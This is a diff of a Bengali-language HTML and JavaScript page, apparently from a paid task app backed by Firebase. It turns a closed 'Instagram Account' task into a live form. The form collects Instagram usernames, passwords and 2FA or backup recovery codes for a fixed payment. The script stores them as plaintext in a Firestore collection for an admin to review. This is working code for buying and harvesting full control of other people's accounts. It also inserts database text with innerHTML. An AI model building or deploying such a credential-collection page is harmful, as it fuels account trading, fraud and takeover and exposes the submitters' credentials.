@@ -9,9 +9,12 @@
     <style>
         :root { 
             --main-pink: #e2005a; 
+            --light-pink: #ff3377;
             --main-white: #ffffff; 
             --text-grey: #888888; 
             --bg-light: #f4f6f9; 
+            --dark-blue: #2c3e50;
+            --success-green: #27ae60;
         }
 
         body { 
@@ -19,60 +22,174 @@
             background-color: #e9ecef; 
             font-family: 'Segoe UI', Tahoma, sans-serif; 
             display: flex; justify-content: center; 
+            height: 100vh; overflow: hidden;
         }
 
         .app-container { 
-            width: 100%; max-width: 450px; min-height: 100vh; 
-            background-color: var(--bg-light); color: var(--main-pink); 
+            width: 100%; max-width: 450px; height: 100vh; 
+            background-color: var(--bg-light); color: var(--dark-blue); 
             box-shadow: 0 0 25px rgba(0,0,0,0.1); 
             display: flex; flex-direction: column; position: relative; 
         }
 
         .header { 
             background-color: var(--main-pink); padding: 15px 20px; 
-            display: flex; justify-content: space-between; align-items: center; 
-            color: var(--main-white); box-shadow: 0 4px 12px rgba(226, 0, 90, 0.2); z-index: 10; 
+            display: flex; align-items: center; 
+            color: var(--main-white); box-shadow: 0 4px 12px rgba(226, 0, 90, 0.2); z-index: 10; flex-shrink: 0;
         }
-        .header-title { font-size: 20px; font-weight: bold; display: flex; align-items: center; }
-        .back-btn { color: white; text-decoration: none; margin-right: 15px; font-size: 22px; }
+        .header-title { font-size: 18px; font-weight: bold; display: flex; align-items: center; }
+        .back-btn { color: white; text-decoration: none; margin-right: 15px; font-size: 20px; }
 
         .content { 
-            flex-grow: 1; padding: 30px 20px; display: flex; 
-            flex-direction: column; align-items: center; justify-content: center; text-align: center; 
+            flex-grow: 1; padding: 20px; overflow-y: auto; padding-bottom: 80px; 
         }
 
-        .off-box {
-            background-color: var(--main-white); border-radius: 12px; padding: 30px 20px;
-            border: 1px solid #eaeaea; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; box-sizing: border-box;
+        .rate-card {
+            background: linear-gradient(135deg, var(--main-pink), var(--light-pink));
+            color: white; border-radius: 12px; padding: 15px 20px; display: flex;
+            justify-content: space-between; align-items: center; margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(226, 0, 90, 0.2);
+        }
+        .rate-card h3 { margin: 0; font-size: 16px; font-weight: bold; }
+        .rate-card .amount { font-size: 22px; font-weight: 900; }
+
+        .submit-card {
+            background-color: #fff; border: 1px solid #eaeaea; border-radius: 12px;
+            padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.03);
+        }
+        .submit-card h3 {
+            margin: 0 0 20px 0; font-size: 16px; font-weight: bold; color: var(--dark-blue);
+            display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #f0f0f0; padding-bottom: 10px;
         }
 
-        .off-box i { font-size: 50px; color: #e74c3c; margin-bottom: 15px; }
-        .off-box h3 { color: #2c3e50; margin: 0 0 10px 0; font-size: 20px; }
-        .off-box p { color: var(--text-grey); font-size: 14px; margin: 0; line-height: 1.5; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label {
+            display: block; font-size: 13px; font-weight: bold; color: #555; margin-bottom: 8px;
+        }
+        .form-control {
+            width: 100%; border: 1px solid #dcdde1; border-radius: 8px; padding: 12px;
+            font-size: 14px; outline: none; transition: 0.3s; box-sizing: border-box; font-family: inherit;
+            color: var(--dark-blue); font-weight: bold;
+        }
+        .form-control:focus { border-color: var(--main-pink); box-shadow: 0 0 0 2px rgba(226, 0, 90, 0.1); }
+        
+        textarea.form-control { resize: vertical; min-height: 80px; }
+
+        .btn-submit {
+            background-color: var(--main-pink); color: white; border: none; width: 100%;
+            padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold;
+            cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px;
+            box-shadow: 0 4px 10px rgba(226, 0, 90, 0.2); margin-top: 10px;
+        }
+        .btn-submit:hover { background-color: #c4004e; transform: translateY(-2px); }
+
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px;
+        }
+        .stat-box {
+            background: #fff; border: 1px solid #eaeaea; border-radius: 10px; padding: 15px 10px;
+            text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+        .stat-box .num { font-size: 18px; font-weight: 900; color: var(--dark-blue); margin-bottom: 5px; }
+        .stat-box .label { font-size: 11px; font-weight: bold; color: var(--text-grey); }
+        .stat-pending .num { color: #f39c12; }
+        .stat-approved .num { color: var(--success-green); }
+        .stat-rejected .num { color: #e74c3c; }
+
+        .rules-card {
+            background-color: #fff; border: 1px solid #eaeaea; border-radius: 12px;
+            padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.03);
+        }
+        .rules-card h3 {
+            margin: 0 0 15px 0; font-size: 16px; font-weight: bold; color: var(--dark-blue);
+            display: flex; align-items: center; gap: 8px;
+        }
+        .rules-card p { font-size: 13px; color: #555; line-height: 1.6; margin: 0; }
+        
+        .video-box {
+            width: 100%; height: 180px; background-color: #000; border-radius: 8px;
+            margin-bottom: 15px; overflow: hidden; display: none;
+        }
+        .video-box iframe { width: 100%; height: 100%; border: none; }
 
         /* বটম নেভবার */
-        .bottom-nav { background-color: var(--main-white); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #eaeaea; position: sticky; bottom: 0; z-index: 100; }
+        .bottom-nav { background-color: var(--main-white); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #eaeaea; position: absolute; bottom: 0; width: 100%; z-index: 100; }
         .nav-item { text-align: center; font-size: 11px; color: var(--text-grey); text-decoration: none; flex: 1; }
         .nav-item i { font-size: 18px; margin-bottom: 4px; display: block; }
         .nav-item.active { color: var(--main-pink); font-weight: bold; }
+
+        /* টোস্ট মেসেজ */
+        .toast-msg {
+            visibility: hidden; background-color: var(--main-pink); color: #fff; text-align: center; border-radius: 8px; padding: 12px 20px; position: fixed; z-index: 9999; top: 20px; left: 50%; transform: translateX(-50%); font-size: 13px; font-weight: bold; box-shadow: 0 4px 15px rgba(226, 0, 90, 0.3); opacity: 0; transition: opacity 0.3s, top 0.3s; min-width: 250px;
+        }
+        .toast-msg.show { visibility: visible; opacity: 1; top: 40px; }
     </style>
 </head>
 <body>
 
+    <div id="toastBox" class="toast-msg"><i class="fas fa-check-circle"></i> <span id="toastText">সফল হয়েছে!</span></div>
+
     <div class="app-container">
         <div class="header">
-            <div class="header-title">
-                <a href="index.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
-                Instagram Account
-            </div>
+            <a href="index.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
+            <div class="header-title">Instagram Account</div>
         </div>
 
         <div class="content">
-            <div class="off-box">
-                <i class="fas fa-ban"></i>
-                <h3>কাজ সাময়িকভাবে বন্ধ আছে!</h3>
-                <p>বর্তমানে ইনস্টাগ্রাম টাস্ক বন্ধ রয়েছে। নতুন কাজ চালু হলে নোটিশ বোর্ডে জানিয়ে দেওয়া হবে। দয়া করে অন্য কাজগুলো করুন।</p>
+            
+            <div class="rate-card">
+                <h3>প্রতিটি অ্যাকাউন্টের মূল্য:</h3>
+                <div class="amount" id="taskRateAmount"><i class="fas fa-spinner fa-spin"></i></div>
             </div>
+
+            <div class="stats-grid">
+                <div class="stat-box stat-pending">
+                    <div class="num" id="statPending">0</div>
+                    <div class="label">Pending</div>
+                </div>
+                <div class="stat-box stat-approved">
+                    <div class="num" id="statApproved">0</div>
+                    <div class="label">Approved</div>
+                </div>
+                <div class="stat-box stat-rejected">
+                    <div class="num" id="statRejected">0</div>
+                    <div class="label">Rejected</div>
+                </div>
+            </div>
+
+            <!-- ফর্ম কার্ড -->
+            <div class="submit-card">
+                <h3><i class="far fa-paper-plane" style="color: var(--main-pink);"></i> আপনার অ্যাকাউন্ট জমা দিন</h3>
+                
+                <div class="input-group">
+                    <label>ইনস্টাগ্রাম ইউজারনেম</label>
+                    <input type="text" id="igUsername" class="form-control" placeholder="যেমন: username">
+                </div>
+                
+                <div class="input-group">
+                    <label>ইনস্টাগ্রাম পাসওয়ার্ড</label>
+                    <input type="text" id="igPassword" class="form-control" placeholder="........">
+                </div>
+
+                <div class="input-group">
+                    <label>2FA / রিকভারি কোড</label>
+                    <textarea id="ig2fa" class="form-control" placeholder="2FA বা ৮ ডিজিটের ব্যাকআপ কোডগুলো এখানে দিন..."></textarea>
+                </div>
+
+                <button class="btn-submit" id="btnSubmitTask" onclick="submitTask()">
+                    <i class="fas fa-upload"></i> জমা দিন
+                </button>
+            </div>
+
+            <!-- নিয়মাবলী কার্ড -->
+            <div class="rules-card" id="rulesCardBox" style="display: none;">
+                <h3><i class="fas fa-info-circle" style="color: var(--main-pink);"></i> কাজের নিয়মাবলী</h3>
+                <div class="video-box" id="ruleVideoBox">
+                    <iframe id="ruleVideo" src="" allowfullscreen></iframe>
+                </div>
+                <p id="ruleText">লোড হচ্ছে...</p>
+            </div>
+
         </div>
 
         <div class="bottom-nav">
@@ -83,5 +200,161 @@
         </div>
     </div>
 
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-auth.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, where, doc, getDoc, updateDoc, increment, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAzfS5v-5tKZZU0b94UllLDm_qQoumo5Bk",
+            authDomain: "send-bkash.firebaseapp.com",
+            projectId: "send-bkash",
+            storageBucket: "send-bkash.firebasestorage.app",
+            messagingSenderId: "306247423891",
+            appId: "1:306247423891:web:bb4fb6634043e6755afa66"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        window.db = db;
+        window.auth = auth;
+        window.addDoc = addDoc;
+        window.collection = collection;
+        window.doc = doc;
+        window.updateDoc = updateDoc;
+        window.increment = increment;
+        window.serverTimestamp = serverTimestamp;
+
+        let currentUserUid = null;
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUserUid = user.uid;
+                
+                // ভেরিফিকেশন চেক
+                getDoc(doc(db, "users", user.uid)).then(docSnap => {
+                    if(docSnap.exists() && docSnap.data().isVerified !== true) {
+                        alert("আপনাকে প্রথমে অ্যাকাউন্ট ভেরিফাই করতে হবে!");
+                        window.location.href = "verification.html";
+                    } else {
+                        loadTaskRate();
+                        loadTaskRules();
+                        loadUserStats();
+                    }
+                });
+            } else {
+                window.location.href = "login.html";
+            }
+        });
+
+        // রেট লোড করা (অ্যাডমিন ড্যাশবোর্ড থেকে)
+        function loadTaskRate() {
+            onSnapshot(doc(db, "admin_settings", "task_rates"), (docSnap) => {
+                if (docSnap.exists() && docSnap.data().instagram) {
+                    document.getElementById('taskRateAmount').innerText = `৳ ${parseFloat(docSnap.data().instagram).toFixed(2)}`;
+                } else {
+                    document.getElementById('taskRateAmount').innerText = `৳ 10.00`; 
+                }
+            });
+        }
+
+        // নিয়মাবলী লোড করা (অ্যাডমিন ড্যাশবোর্ড থেকে)
+        function loadTaskRules() {
+            const q = query(collection(db, "task_rules"), where("platform", "==", "Instagram Account"));
+            onSnapshot(q, (snapshot) => {
+                if (!snapshot.empty) {
+                    document.getElementById('rulesCardBox').style.display = 'block';
+                    snapshot.forEach((docSnap) => {
+                        const data = docSnap.data();
+                        document.getElementById('ruleText').innerHTML = data.rulesText.replace(/\n/g, '<br>');
+                        
+                        if(data.videoUrl && data.videoUrl.trim() !== "") {
+                            document.getElementById('ruleVideoBox').style.display = 'block';
+                            document.getElementById('ruleVideo').src = data.videoUrl;
+                        } else {
+                            document.getElementById('ruleVideoBox').style.display = 'none';
+                        }
+                    });
+                }
+            });
+        }
+
+        // ইউজারের কাজের হিস্ট্রি (কয়টা পেন্ডিং/অ্যাপ্রুভড)
+        function loadUserStats() {
+            const q = query(collection(db, "tasks"), where("userId", "==", currentUserUid), where("platform", "==", "Instagram Account"));
+            onSnapshot(q, (snapshot) => {
+                let pending = 0, approved = 0, rejected = 0;
+                snapshot.forEach(docSnap => {
+                    const status = docSnap.data().status;
+                    if(status === 'pending') pending++;
+                    else if(status === 'approved') approved++;
+                    else if(status === 'rejected') rejected++;
+                });
+                
+                document.getElementById('statPending').innerText = pending;
+                document.getElementById('statApproved').innerText = approved;
+                document.getElementById('statRejected').innerText = rejected;
+            });
+        }
+
+        // ডাটাবেসে কাজ জমা দেওয়া
+        window.submitTask = async function() {
+            const username = document.getElementById("igUsername").value.trim();
+            const password = document.getElementById("igPassword").value.trim();
+            const twoFA = document.getElementById("ig2fa").value.trim();
+            
+            if (username === "" || password === "" || twoFA === "") {
+                showToast("দয়া করে ইউজারনেম, পাসওয়ার্ড এবং 2FA কোড প্রদান করুন!");
+                return;
+            }
+
+            const btn = document.getElementById("btnSubmitTask");
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> জমা হচ্ছে...';
+            btn.disabled = true;
+
+            const details = `Username: ${username}\nPassword: ${password}\n2FA/Recovery: ${twoFA}`;
+
+            try {
+                // ১. tasks কালেকশনে যোগ করা (যাতে অ্যাডমিন প্যানেলে যায়)
+                await window.addDoc(window.collection(window.db, "tasks"), {
+                    userId: currentUserUid,
+                    platform: "Instagram Account",
+                    details: details,
+                    status: "pending",
+                    rejectReason: "",
+                    timestamp: window.serverTimestamp()
+                });
+
+                // ২. ইউজারের totalTasks কাউন্ট বাড়ানো
+                await window.updateDoc(window.doc(window.db, "users", currentUserUid), {
+                    totalTasks: window.increment(1)
+                });
+
+                showToast("আপনার ইনস্টাগ্রাম অ্যাকাউন্ট সফলভাবে জমা হয়েছে!");
+                
+                // ইনপুট ক্লিয়ার
+                document.getElementById("igUsername").value = "";
+                document.getElementById("igPassword").value = "";
+                document.getElementById("ig2fa").value = "";
+
+            } catch (error) {
+                console.error(error);
+                alert("জমা দিতে সমস্যা হয়েছে! আবার চেষ্টা করুন।");
+            } finally {
+                btn.innerHTML = '<i class="fas fa-upload"></i> জমা দিন';
+                btn.disabled = false;
+            }
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById("toastBox");
+            document.getElementById("toastText").innerText = message;
+            toast.classList.add("show");
+            setTimeout(() => { toast.classList.remove("show"); }, 3000);
+        }
+    </script>
 </body>
 </html>
